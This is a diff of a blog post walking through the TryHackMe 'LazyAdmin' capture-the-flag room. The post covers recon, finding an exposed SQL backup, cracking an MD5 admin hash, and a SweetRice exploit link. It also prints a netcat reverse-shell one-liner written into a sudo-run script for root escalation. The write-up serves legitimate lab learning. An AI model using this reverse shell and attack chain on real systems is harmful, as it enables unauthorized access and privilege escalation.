@@ -21,7 +21,7 @@ published: true
 1. What is the user flag?
 2. What is the root flag?
 
-# Recon
+# Step 0 - Recon
 ## Nmap
 ``` bash
 $ nmap -sC -sV 10.10.26.136
@@ -43,11 +43,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 28.88 seconds
 ````
-
 Nice, port 80 is open, but nothing interesting on it, only the default Apache page.
-
-![LazyAdmin - Apache default page](/assets/images/ctf-lazyadmin/01.png)
-
+![LazyAdmin - Apache default page](/assets/images/ctf-lazyadmin/01.png){:class="post-image"}
 
 ## Gobuster
 ``` bash
@@ -59,11 +56,8 @@ $ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 10.10.
 /index.html           (Status: 200) [Size: 11321]
 /server-status        (Status: 403) [Size: 277]
 ```
-
 We have a 'strange' directory: `/content`. Let's check it out.
-
-![LazyAdmin - /content directory](/assets/images/ctf-lazyadmin/02.png)
-
+![LazyAdmin - /content directory](/assets/images/ctf-lazyadmin/02.png){:class="post-image"}
 
 ## Gobuster on /content
 ``` bash
@@ -79,7 +73,6 @@ $ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 10.10.
 /index.php            (Status: 200) [Size: 2198]
 /js                   (Status: 301) [Size: 317] [--> http://10.10.26.136/content/js/]
 ```
-
 Directory index is enabled. `/as` contains the admin panel of the website, but we don't have any credentials (YET).
 The directory `/inc` contains another folder: `/inc/mysql_backup`. Inside it, we have a file called `mysql_bakup_20191129023059-1.5.1.sql`. Let's download it and check it out.
 ```php
@@ -93,8 +86,7 @@ The directory `/inc` contains another folder: `/inc/mysql_backup`. Inside it, we
 ```
 We have found the credentials for the admin panel: `manager:42f749ade7f9e195bf475f37a44cafcb` (MD5 hash).
 
-
-# John the Ripper
+## John the Ripper
 ``` bash
 $ echo 42f749ade7f9e195bf475f37a44cafcb > hash.txt && john --format=RAW-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 Using default input encoding: UTF-8
@@ -106,20 +98,16 @@ Password123      (?)
 Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
 Session completed.
 ```
-
 So the admin account is:
 - Username: `manager`
 - Password: `Password123`
+![LazyAdmin - Admin panel](/assets/images/ctf-lazyadmin/03.png){:class="post-image"}
 
-![LazyAdmin - Admin panel](/assets/images/ctf-lazyadmin/03.png)
-
-
-# Exploit
+## Exploit
 In this version of SweetRice, there is a vulnerability that allows us to use a PHP shell. We can use it to get a reverse shell.
 [https://www.exploit-db.com/exploits/40700](https://www.exploit-db.com/exploits/40700){:target="_blank"}
 
-
-# User.txt
+# Question 1 - What is the user flag?
 ```sh
 $ nc -lnvp 9001
 listening on [any] 9001 ...
@@ -127,9 +115,10 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ cat /home/itguy/user.txt
 THM{***************************}
 ````
+The user flag is: `THM{***************************}`
 
-
-# Privilege escalation
+# Question 2 - What is the root flag?
+## Privilege escalation
 ```sh
 $ sudo -l 
 Matching Defaults entries for www-data on THM-Chal:
@@ -155,8 +144,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.32.129 9002 >/tmp/f
 $ sudo /usr/bin/perl /home/itguy/backup.pl
 ```
 
-
-# Root.txt
+## Root.txt
 ```sh
 $ nc -lnvp 9002
 listening on [any] 9002 ...
@@ -168,3 +156,4 @@ root.txt
 # cat root.txt
 THM{***************************}
 ```
+The root flag is: `THM{***************************}`
